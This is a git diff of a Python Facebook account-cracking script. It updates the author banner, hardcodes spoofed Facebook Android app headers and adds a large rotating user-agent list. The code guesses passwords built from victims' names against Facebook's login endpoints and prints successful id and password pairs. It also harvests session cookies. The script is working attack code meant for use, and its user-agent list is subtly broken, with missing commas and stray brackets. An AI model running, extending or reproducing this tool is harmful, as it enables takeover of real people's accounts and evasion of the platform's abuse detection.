@@ -86,10 +86,10 @@ logo =                                          """
 \033[1;37m    Y88b  d88P Y88b  d88P 888   Y8888
 \033[1;37m     "Y8888P"   "Y8888P"  888    Y888
 \033[1;37m------------------------------------------------
-\033[1;37m Owner   :            Muhammad Suhbat
-\033[1;37m Facebook:            Muhammad Suhbat
-\033[1;37m Github  :            Suhbat-Ssn
-\033[1;37m Version :            S1.2
+\033[1;37m Owner   :            SSN_906
+\033[1;37m Facebook:          PRINCE=P
+\033[1;37m Github  :            SSN
+\033[1;37m Version :            S1.3
 \033[1;37m------------------------------------------------ """
 def clear():
     os.system("clear")
@@ -232,21 +232,7 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': randBuildvsskj(),
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-'X-FB-Connection-Type': 'MOBILE.LTE',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 5; ARE-L22HN Build/QP1A.521094.694) [FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/353870778;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/354800271;FBCR/NTT DOCOMO;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1983;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '22739', 'X-FB-SIM-HNI': '35221', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SSNb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SSNb};{ckkk}"
@@ -298,21 +284,7 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': randBuildLSB(),
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-'X-FB-Connection-Type': 'MOBILE.LTE',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 5; ARE-L22HN Build/QP1A.521094.694) [FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/353870778;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/354800271;FBCR/NTT DOCOMO;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1983;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '22739', 'X-FB-SIM-HNI': '35221', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SSNb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SSNb};{ckkk}"
@@ -364,21 +336,7 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-                headers = {'User-Agent': randBuildHHL(),
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': str(random.randint(20000, 40000)),
-'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
-'X-FB-Connection-Type': 'MOBILE.LTE',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                headers = {'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 5; ARE-L22HN Build/QP1A.521094.694) [FBAN/FB4A;FBAV/356.0.0.28.112;FBBV/353870778;FBDM/{density=3.0,width=1080,height=2132};FBLC/en_US;FBRV/354800271;FBCR/NTT DOCOMO;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1983;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '22739', 'X-FB-SIM-HNI': '35221', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SSNb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SSNb};{ckkk}"
@@ -409,7 +367,61 @@ class main_crack():
             for pw in psw:
                 ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                 session=requests.Session()
-                sua = random.choice(sagent)
+                ua = random.choice (["Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.2 Chrome/44.0.2403.133 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36)",
+ "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36]"
+ "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36)"
+ "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36",
+ "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J200G Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.5 Chrome/38.0.2125.102 Mobile Safari/537.36]"
+ "Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36]"
+ "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36;]"
+ "Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36;]"
+ "Mozilla/5.0 (Linux; Android 8.1.0; SAMSUNG SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G570M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36;]"
+ "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532MT) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36)"
+ "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A205G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36;]"
+ "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J700M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36]"
+ "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-N950F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36]"
+ "Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36;]"
+ "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.0 Chrome/75.0.3770.143 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-J500M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 11; SM-A105FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]"
+ "Mozilla/5.0 (Linux; Android 13; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 12; LE2121) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 11; Redmi Note 9S Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 Instagram 263.2.0.19.104 Android (30/11; 440dpi; 1080x2168; Xiaomi/Redmi; Redmi Note 9S; curtana; qcom; it_IT; 428413139)"
+ "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 265.0.0.13.302 (iPhone13,3; iOS 16_1_1; it_IT; it-IT; scale=3.00; 1170x2532; 435784589)"
+ "Mozilla/5.0 (Linux; Android 11; CPH1941 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]"
+ "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 [ip:188.218.211.54]"
+ "Mozilla/5.0 (Linux; Android 12; SM-A037G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 Instagram 264.0.0.22.106 Android (31/12; 320dpi; 720x1459; samsung; SM-A037G; a03s; mt6765; it_IT; 430370701)"
+ "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36 Herring/91.1.5770.71"
+ "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 9; SM-G973U Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 5.1.1; SM-G928X Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 7.1.1; Google Pixel Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/54.0.2840.85 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 9; J8110 Build/55.0.A.0.552; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36"
+ "Mozilla/5.0 (Linux; Android 10; HTC Desire 21 pro 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36"
+ "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1"
+ "Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
+ "Mozilla/5.0 (iPhone12,1; U; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1"
+ "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254"
+ "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246"
+ "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36"
+ "Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36"
+ "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
+ "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0"
+ "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"])  
                 getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={sid}&flow=login_no_pin&refsrc=deprecated&_rdr')
                 idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":sid,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":ps,}
                 session.headers = {}
@@ -430,7 +442,7 @@ class main_crack():
                 'sec-fetch-site': 'none',
                 'sec-fetch-user': '?1',
                 'upgrade-insecure-requests': '1',
-                'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
+                'user-agent': pro,}
                 complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False)
                 if 'c_user' in session.cookies.get_dict():
                     print(f"\r{R} [SSN-OK] {sid} | {ps} {S}")
